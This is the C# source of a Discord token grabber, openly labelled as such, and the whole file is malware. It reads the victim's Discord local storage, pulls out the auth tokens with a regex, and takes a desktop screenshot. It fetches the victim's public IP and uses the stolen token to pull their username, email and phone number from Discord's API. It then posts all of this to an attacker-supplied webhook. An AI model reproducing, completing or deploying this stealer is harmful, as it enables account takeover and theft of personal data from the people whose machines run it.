using System;
using System.Collections.Generic;
using System.Drawing;
using System.Runtime.InteropServices;
using System.IO;
using Token_Grabber.ScreenCatcher;
using System.Drawing.Imaging;
using System.Windows.Forms;
using System.Text.RegularExpressions;
using System.Net.Http;
using System.Net;

namespace Token_Grabber
{
   internal class Program
    {
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        public static string username = SystemInformation.UserName;
        public static string webhook = "PASTE YOUR WEBHOOK HERE";
        public static string webHookName = "Token grabber by Zeczero";
        public static string screenPath;
        public static string victimUsername = "";
        private static List<string> token = new List<string>();
        public static Guid guid = new Guid();
        public static string fileName;
        public static string phoneNumber;
        public static string victimEmail;
        public static string discriminator;
        public static byte[] imgArray;
        //static readonly string path = @"C:\Users\" + username + @"\AppData\Roaming\Discord\Local Storage\leveldb\*.log";
        static void GetTokens()
        {
            try
            {
                var file = File.ReadAllText($"{Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)}//Discord//Local Storage//leveldb//000005.ldb");
                Regex reg = new Regex(@"[\w-]{24}\.[\w-]{6}\.[\w-]{27}");
                MatchCollection matches = reg.Matches(file);
                if (matches.Count > 0)
                {
                    Match match = matches[0];
                    GroupCollection groupCollection = match.Groups;
                    //Console.WriteLine("Found: " + groupCollection[0].ToString());
                    string grabbedToken = groupCollection[0].ToString();
                    token.Add(grabbedToken);
                }
            }
            catch (Exception)
            {
                return;
            }
        }
        static string GrabIp()
        {
            var httpClient = new HttpClient();
            string ip = httpClient.GetStringAsync("https://api.ipify.org").Result;

            return ip;
        }
       static void GetVictimData()
       {
            CookieContainer cookieContainer = new CookieContainer();
                var request = (HttpWebRequest)WebRequest.Create("https://discord.com/api/v7/users/@me");
                request.Headers["authorization"] = token[0];
                request.Method = "GET";
                request.ContentType = "application/json";
                request.CookieContainer = cookieContainer;
                var response = (HttpWebResponse)request.GetResponse();
                var responseString = new StreamReader(response.GetResponseStream()).ReadToEnd();
            try
            {
                victimUsername = responseString.Split(new[] { "\"username\": \"" }, StringSplitOptions.None)[1].Split('"')[0];
                discriminator = responseString.Split(new[] { "\"discriminator\": \"" }, StringSplitOptions.None)[1].Split('"')[0];
                victimEmail = responseString.Split(new[] { "\"email\": \"" }, StringSplitOptions.None)[1].Split('"')[0];
                phoneNumber = responseString.Split(new[] { "\"phone\": \"" }, StringSplitOptions.None)[1].Split('"')[0];

                if (victimEmail.Equals("null"))
                {
                    phoneNumber = "Phone number is not assigned to the account";
                }
                if (victimEmail.Equals("null"))
                {
                    victimEmail = "Email is not assigned to the account";
                }
            }
            catch (Exception)
            {

            }
        }

        public static int SendTokens()
        {

            HttpClient http = new HttpClient();
            for (int i = 0; i < token.Count; i++)
            {
                FileStream picOfDesktop = new FileStream(screenPath, FileMode.Open);
                MultipartFormDataContent Payload = new MultipartFormDataContent();

                Payload.Add(new StringContent(webHookName), "username");
                Payload.Add(new ByteArrayContent(imgArray, 0, imgArray.Length), "Proof", "hi.jpg");
                Payload.Add(new StringContent(string.Concat(new string[] {
                    "```c\n",
                    "\n Public IP:", GrabIp(),
                    "\n Token: ", token[i],
                    "\n Nickname: ", victimUsername + "#" + discriminator,
                    "\n Email: ", victimEmail,
                    "\n Phone number (if assigned)", phoneNumber,
                    "```"}
                )), "content");
                try
                {
                    HttpResponseMessage httpReply = http.PostAsync(webhook, Payload).Result;
                }
                catch (Exception)
                {
                    return 0;
                }
            }
            return 0;
        }


        static void Main(string[] args)
        {
            username = SystemInformation.UserName;
            fileName = guid.ToString().Split('-')[0];
            try
            {
                screenPath = "C:\\Users\\" + username + "\\AppData\\Local\\" + fileName + ".jpg";
                ScreenCatch sc = new ScreenCatch();
                Image img = sc.CaptureScreen();
                try
                {
                    sc.CaptureScreenToFile(screenPath, ImageFormat.Jpeg);
                    imgArray = File.ReadAllBytes(screenPath);
                    // base64rep = Convert.ToBase64String(imgArray);
                }
                catch (IOException ex)
                {
                    Console.WriteLine(ex.ToString());
                }
            }
            catch (Exception)
            {

            }
            GetTokens();
            SendTokens();
            Console.ReadKey();
        }
    }
}